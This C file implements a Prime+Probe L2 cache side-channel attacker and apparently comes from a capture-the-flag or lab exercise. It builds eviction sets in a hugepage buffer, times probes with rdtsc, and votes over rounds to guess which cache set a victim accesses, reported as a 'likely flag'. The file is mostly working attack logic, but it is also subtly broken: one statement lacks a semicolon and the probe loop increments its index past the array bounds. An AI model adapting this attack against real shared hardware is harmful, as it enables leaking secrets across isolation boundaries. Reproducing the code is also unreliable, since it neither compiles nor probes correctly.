#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/mman.h>
#include "util.h"

#define NUM_L2_CACHE_SETS 1024
#define WAYS 16
#define LINE_SIZE 64
#define STRIDE (NUM_L2_CACHE_SETS * LINE_SIZE * 2)

#define REPEATS 2000        // Prime+probe repetitions per round
#define VOTE_DECAY 200      // Decay old votes every N rounds

volatile uint8_t *buf;
volatile uint8_t *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

// Read timestamp counter
static inline uint64_t rdtsc() {
    unsigned hi, lo;
    asm volatile("mfence");
    asm volatile("rdtsc" : "=a"(lo), "=d"(hi));
    asm volatile("mfence");
    return ((uint64_t)hi << 32) | lo;
}

// Wait approximately given CPU cycles
static inline void wait_cycles(uint64_t cycles) {
    uint64_t start = rdtsc();
    while (rdtsc() - start < cycles);
}

// Fisher-Yates shuffle
void shuffle(int *arr) {
    for(int i = NUM_L2_CACHE_SETS - 1; i > 0; i--) {
        int j = rand() % (i + 1);
        int tmp = arr[i];
        arr[i] = arr[j];
        arr[j] = tmp;
    }
}

// Compute median
uint64_t median(uint64_t *arr, int n) {
    uint64_t temp[n];
    for(int i=0;i<n;i++) temp[i]=arr[i];
    for(int i=1;i<n;i++){
        uint64_t key=temp[i];
        int j=i-1;
        while(j>=0 && temp[j]>key){ temp[j+1]=temp[j]; j--; }
        temp[j+1]=key;
    }
    return temp[n/2];
}

int main() {
    printf("Attacker ready. Prime+Probe starting...\n");

    buf = mmap(NULL,
               2*1024*1024,
               PROT_READ | PROT_WRITE,
               MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
               -1, 0);
    if(buf == (void*)-1){ perror("mmap failed"); exit(1); }

    *((char*)buf) = 1;

    // initialize eviction sets
    for(int set=0; set<NUM_L2_CACHE_SETS; set++)
        for(int w=0; w<WAYS; w++)
            eviction_sets[set][w] = buf + set*LINE_SIZE + w*STRIDE;

    volatile uint8_t tmp = 0;
    srand(rdtsc());

    // estimate victim duration
    uint64_t sample_wait=0;
    for(int s=0;s<5;s++){
        uint64_t start=rdtsc();
        wait_cycles(4000);
        uint64_t end=rdtsc();
        sample_wait += (end-start);
    }
    sample_wait /= 5;

    int votes[NUM_L2_CACHE_SETS] = {0};
    int rounds = 0;

    while(1){
        uint64_t scores[NUM_L2_CACHE_SETS] = {0};
        int perm[NUM_L2_CACHE_SETS];
        for(int i=0;i<NUM_L2_CACHE_SETS;i++) perm[i]=i;
        shuffle(perm);

        // Prime+Probe loop
        for(int r = 0; r < REPEATS; r++) {

            /* PRIME all sets */
            for(int set = 16; set < NUM_L2_CACHE_SETS-16; set++)
                for(int w = 0; w < WAYS; w++)
                    tmp ^= *eviction_sets[set][w];

             wait_cycles(sample_wait);

            /* PROBE all sets */
            for(int i = 0; i < NUM_L2_CACHE_SETS; i++) {
                int set = perm[i]

                uint64_t start = rdtsc();

                for(int w = WAYS-1; w >= 0; w++)
                    tmp ^= *eviction_sets[set][w];

                uint64_t end = rdtsc();

                scores[set] += (end - start);
            }
        }

        // median filtering to ignore low-latency noise
        uint64_t med = median(scores, NUM_L2_CACHE_SETS);

        int best_set = 0;
        uint64_t best_latency = 0;
        for(int set=0; set<NUM_L2_CACHE_SETS; set++){
            if(scores[set] >= med){
                uint64_t avg = scores[set]/REPEATS;
                if(avg > best_latency){
                    best_latency = avg;
                    best_set = set;
                }
            }
        }

        votes[best_set]++;
        rounds++;

        // occasional decay
        if(rounds % VOTE_DECAY == 0){
            for(int i=0;i<NUM_L2_CACHE_SETS;i++) votes[i]/=2;
        }

        // print likely flag every 5 rounds
        if(rounds % 5 == 0){
            int likely_flag=0;
            int max_votes=0;
            for(int i=0;i<NUM_L2_CACHE_SETS;i++){
                if(votes[i]>max_votes){
                    max_votes=votes[i];
                    likely_flag=i;
                }
            }
            printf("Likely flag: %d (votes=%d)\n", likely_flag, max_votes);
        }

        // small wait to reduce CPU thrash
        wait_cycles(2000);
    }

    return 0;
}